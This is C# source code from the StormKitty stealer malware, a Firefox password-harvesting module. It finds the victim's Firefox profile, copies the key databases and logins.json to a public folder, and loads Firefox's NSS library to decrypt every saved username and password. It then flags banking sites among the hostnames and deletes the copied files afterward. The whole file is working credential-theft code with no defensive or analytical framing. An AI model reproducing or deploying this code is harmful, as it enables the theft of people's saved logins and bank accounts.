using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using StormKitty;

namespace Stealer.Firefox
{
	internal sealed class cPasswords
	{
		private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
		private static string MozillaPath = Path.Combine(SystemDrive, "Program Files\\Mozilla Firefox");
		private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
		private static string[] requiredFiles = new string[] { "key3.db", "key4.db", "logins.json", "cert9.db" };

		private sealed class FFRegex
		{
			public static Regex hostname = new Regex("\"hostname\":\"([^\"]+)\"");
			public static Regex username = new Regex("\"encryptedUsername\":\"([^\"]+)\"");
			public static Regex password = new Regex("\"encryptedPassword\":\"([^\"]+)\"");
		}

		// Get profile directory location
		private static string GetProfile(string path)
		{
			try
			{
				string dir = path + "\\Profiles";
				if (Directory.Exists(dir))
					foreach (string sDir in Directory.GetDirectories(dir))
						if (File.Exists(sDir + "\\logins.json")) return sDir;
			}
			catch (Exception ex) { Logging.Log("Firefox >> Failed to find profile\n" + ex); }
			return null;
		}

		// Copy key3.db, key4.db, logins.json if exists
		private static string CopyRequiredFiles(string profile)
		{
			string profileName = new DirectoryInfo(profile).Name;
			string newProfileName = Path.Combine(CopyTempPath, profileName);

			if (!Directory.Exists(newProfileName))
				Directory.CreateDirectory(newProfileName);

			foreach (string file in requiredFiles)
				try
				{
					string requiredFile = Path.Combine(profile, file);
					if (File.Exists(requiredFile))
						File.Copy(requiredFile, Path.Combine(newProfileName, Path.GetFileName(requiredFile)));
				}
				catch (Exception ex)
				{
					Logging.Log("Firefox >> Failed to copy files to decrypt passwords\n" + ex);
					return null;
				}

			return Path.Combine(CopyTempPath, profileName);
		}

		// Get bookmarks from gecko browser
		public static List<Password> Get(string path)
		{
			List<Password> pPasswords = new List<Password>();
			// Get firefox default profile directory
			string profile = GetProfile(path);
			if (profile == null) return pPasswords;
			// Copy required files to temp dir
			string newProfile = CopyRequiredFiles(profile);
			if (newProfile == null) return pPasswords;

			try
			{
				string JSON = File.ReadAllText(Path.Combine(newProfile, "logins.json"));
				JSON = Regex.Split(JSON, ",\"logins\":\\[")[1];
				JSON = Regex.Split(JSON, ",\"potentiallyVulnerablePasswords\"")[0];
				string[] accounts = Regex.Split(JSON, "},");

				if (Decryptor.LoadNSS(MozillaPath))
				{
					if (Decryptor.SetProfile(newProfile))
					{
						foreach (string account in accounts)
						{

							Match
								host = FFRegex.hostname.Match(account),
								user = FFRegex.username.Match(account),
								pass = FFRegex.password.Match(account);

							if (host.Success && user.Success && pass.Success)
							{
								string
									hostname = Regex.Split(host.Value, "\"")[3],
									username = Decryptor.DecryptPassword(Regex.Split(user.Value, "\"")[3]),
									password = Decryptor.DecryptPassword(Regex.Split(pass.Value, "\"")[3]);
								
								Password pPassword = new Password();
								pPassword.sUrl = hostname;
								pPassword.sUsername = username;
								pPassword.sPassword = password;

								// Analyze value
								Banking.ScanData(hostname);
								Counter.Passwords++;

								pPasswords.Add(pPassword);
							}
						}
					}
					Decryptor.UnLoadNSS();
				}
			}
			catch (Exception ex) { Logging.Log("Firefox >> Failed collect passwords\n" + ex); }
			Filemanager.RecursiveDelete(newProfile);
			return pPasswords;
		}
	}
}